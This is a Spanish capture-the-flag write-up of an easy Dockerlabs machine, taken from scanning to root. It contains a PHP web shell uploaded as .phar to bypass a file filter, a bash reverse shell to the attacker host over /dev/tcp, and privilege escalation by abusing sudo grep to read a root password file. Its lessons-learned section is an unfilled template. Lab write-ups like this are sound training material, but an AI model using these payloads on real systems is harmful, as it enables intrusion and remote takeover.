
# Writeup Template: Maquina `[ Dockerlabs ]`

- Tags: #Dockerlabs
- Dificultad: `[ Facil ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Dockerlabs](https://mega.nz/file/EPFy0CzA#DIz-H4Fa172X5m0t01FtdEXJO7pMIzDu4nTBdAklzFY) Laboratorio para aprender sobre seguridad en contenedores Docker.

## Configuración del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x dockerlabs.zip
sudo bash auto_deploy.sh dockerlabs.tar
```

---

## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sC -sV -p80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
```
---

## Enumeracion de [Servicio Web Principal]
Direccion URL del servicio:
```bash
http://172.17.0.2/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2
```

Reporte:
```bash
/uploads/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
```bash
/uploads/             (Status: 200) [Size: 741]
```

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,php.back,backup,txt,sh,html,js
```

- **Hallazgos**:
```bash
/index.php            (Status: 200) [Size: 8235]
/uploads              (Status: 301) [Size: 310] [--> http://172.17.0.2/uploads/]
/scripts.js           (Status: 200) [Size: 919]
/upload.php           (Status: 200) [Size: 0]
/machine.php          (Status: 200) [Size: 1361]
```

Tenemos un ruta donde podemos cargar archivos, De la cual nos aprovecharemos si no valida correctamente el tipo de archivo:
```bash
http://172.17.0.2/machine.php
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Crearemos un archivo malicioso bajo el nombre: **( cmd.php )** que nos permitira cargar una llamada a nivel de sistema para ejecutar un comando. y su contenido es:
```php
<?php
  system($_GET["cmd"]);
?>
```

**Nota** De primera no permite archivos que no sean **( .zip )** asi que probaremos todo tipo de extensiones:
[PHP Extensiones](https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/file-upload/alt-extensions-php.txt) -> Usaremos este recurso
Despues de **interceptar** la peticion y mandarla al mofo **repeater** para pobar todo tipo de extensiones tenemos una valida que nos permitio cargar nuestro archivo php malicioso:
```bash
Content-Disposition: form-data; name="file"; filename="cmd.phar"
Content-Type: application/x-php

<?php
  system($_GET["cmd"]);
?>
```
### Ejecucion del Ataque
Ahora tocar revisar el la siguiente ruta si esta cargado correctamente nuestro archivo:
```bash
http://172.17.0.2/uploads/
```

Revisando se ha cargado con exito el archivo asi que procedemos a ejecutarlo para ver si podemos ejecutar comandos:
```bash
# Comandos para explotación
http://172.17.0.2/uploads/cmd.phar?cmd=whoami
```

### Intrusion
Una ves logrado ejecutar comandos en la maquina victima, Nos pondremos en modo escuchar para mandarnos una **revershell** en nuestra maquina de atacante:
```bash
nc -nlvp 443
```

```bash
# Reverse shell o acceso inicial
172.17.0.2/uploads/cmd.phar?cmd=bash -c 'exec bash -i %26>/dev/tcp/172.17.0.1/443 <%261'
```

---
## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos clave ejecutados
sudo -l

User www-data may run the following commands on 147e7d07823f:
    (root) NOPASSWD: /usr/bin/cut
    (root) NOPASSWD: /usr/bin/grep
```
### Explotacion de Privilegios
revisando archivos en este directorio tenemos:
```bash
/opt/nota.txt
```

El cual nos aprovecharemos de del binario para poder leer su contenido:
###### Usuario `[ www-data ]`:
```bash
sudo -u root /usr/bin/grep '' /root/clave.txt
dockerlabsmolamogollon123 # Password de root
```

Nos loguemos como root
```bash
# Comando para escalar al usuario: ( root )
su root # ( dockerlabsmolamogollon123 )
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@147e7d07823f:~# whoami
root
```

---

## Lecciones Aprendidas
1. [Lección 1]
2. [Lección 2]
3. [Lección 3]

## Recomendaciones de Seguridad
- [Recomendación 1]
- [Recomendación 2]
- [Recomendación 3]